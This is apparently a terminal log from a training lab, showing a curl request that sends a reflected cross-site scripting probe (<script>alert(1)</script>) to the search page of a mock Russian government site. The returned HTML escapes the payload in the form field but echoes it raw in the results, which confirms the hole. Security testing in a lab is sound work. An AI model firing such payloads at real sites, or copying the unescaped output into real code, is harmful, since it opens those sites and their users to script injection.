@@ -1,0 +1,28 @@
+aquila@aquila-brnhxx:~$ docker exec gis-client curl -k -sS -m5 'https://198.51.100.1/search.php?q=%3Cscript%3Ealert(1)%3C/script%3E'
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<title>Поиск — Счётная палата РФ (учебный стенд)</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<header>
+<h1>Интернет-сайт Счётной палаты РФ — учебный стенд ГИС «АУО»</h1>
+<nav>
+<a href="index.php">Главная</a>
+<a href="news.php">Новости</a>
+<a href="documents.php">Документы</a>
+<a href="search.php">Поиск</a>
+</nav>
+</header>
+<h2>Поиск по новостям</h2>
+<form method="get" action="search.php">
+    <input type="text" name="q" value="&lt;script&gt;alert(1)&lt;/script&gt;">
+    <button type="submit">Искать</button>
+</form>
+<p>
+Результаты по запросу:
+<script>alert(1)</script></p>
+</body>
+</html>
